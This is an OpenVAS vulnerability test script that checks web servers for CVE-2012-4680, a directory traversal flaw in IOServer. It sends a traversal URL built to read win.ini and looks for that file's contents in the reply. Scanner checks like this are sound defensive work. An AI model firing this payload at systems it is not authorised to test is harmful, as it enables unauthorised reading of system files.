###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ioserver_mult_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# IOServer Trailing Backslash Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.
  Impact Level: Application";
tag_affected = "IOServer version 1.0.18.0 and prior";
tag_insight = "The flaws are due to improper validation of URI containing
  ../ (dot dot) sequences, which allows attackers to read arbitrary files
   via directory traversal attacks.";
tag_solution = "Upgrade to IOServer version 1.0.19.0 or later,
  For updates refer to http://www.ioserver.com/";
tag_summary = "This host is running IOServer and is prone to multiple directory
  traversal vulnerabilities.";

if(description)
{
  script_id(802445);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-4680");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-08-20 16:21:46 +0530 (Mon, 20 Aug 2012)");
  script_name("IOServer Trailing Backslash Multiple Directory Traversal Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.foofus.net/?page_id=616");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2012/Aug/223");

  script_description(desc);
  script_summary("Determine if its possible to read the content of win.ini file");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www", 81);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = "";
banner = "";
exp = "";
url = "";

## Get HTTP Port
port = get_http_port(default:81);
if(!port){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: IOServer" >!< banner) {
  exit(0);
}

foreach exp (make_list("/windows/win.ini", "/winnt/win.ini"))
{
  ## Send the constructed exploit
  url = "/.../.../.../..." + exp;
  if(http_vuln_check(port:port, url:url,pattern:"-bit app support",
                     extra_check:"[extensions]"))

  {
    security_warning(port);
    exit(0);
  }
}
